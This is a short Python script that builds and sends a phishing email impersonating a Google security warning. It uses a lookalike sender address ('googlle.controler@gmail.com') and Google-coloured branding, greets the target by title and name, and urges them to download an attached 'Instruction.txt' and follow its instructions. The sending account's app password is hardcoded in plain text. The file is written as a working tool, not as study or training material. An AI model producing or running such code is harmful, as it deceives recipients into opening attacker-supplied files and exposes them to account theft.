# inspire from: https://www.youtube.com/watch?v=g_j6ILT-X0k

from email.message import EmailMessage
import ssl  # security
import smtplib  # to send the mail
#from email.MIMEImage import MIMEImage
from email.mime.application import MIMEApplication
from os.path import basename


def send(title, username, receiver):
    email_sender = "googlle.controler@gmail.com"
    email_password = "ggbpadkhcayksuoe"
    email_receiver = receiver

    subject = "SECURITY WARNING"

    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.add_alternative(f"""
    <html>
        <body>
        <center>
        <br></br>
        <p style = "font-size: 20px">
        <strong>

            <FONT COLOR = blue>G<FONT COLOR = red>o<FONT COLOR = #DEC20B>o<FONT COLOR = blue>g<FONT COLOR = green>l<FONT COLOR = red>e
        </strong>
        </p>

        <p style="font-family: Arial" "font-size: 40px">
        <FONT COLOR = #000000>
            <strong>An app password has been created <br> to log into your account </br></strong>
        </p>
   
        <p>
        <FONT COLOR = #000000>
        Hello {title} {username}
        <br><FONT COLOR = #000000>We noticed that someone changed your email password</br>
        <FONT COLOR = red><br>
        If this is not you - download the attached file and follow the instructions
        </p><br>

        <p style = "font-size: 12px">
        <FONT COLOR = #000000>
        Google reminds you that a hack into an account <br>may lead leakage of passwords and personal details</br>
        </p>

        </center>
        </body>
    </html>
    """, subtype="html")

    context = ssl.create_default_context()  # for security

    # add an attachment
    file_name = 'Instruction.txt'
    with open(file_name, 'r') as f:
        attachment = MIMEApplication(f.read(), Name=basename(file_name))

    em.attach(attachment)

    
 
    print("connect to Gmail ...")
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context) as smtp: # the sender is send from google acount, the port, the secure message
        print("trying to connect to sender mail ...")
        smtp.login(email_sender, "ggbp adkh cayk suoe")
        print("connected.")
        print("sendind the email ...")
        smtp.sendmail(email_sender, email_receiver, em.as_string())
        print("The email was sent successfully")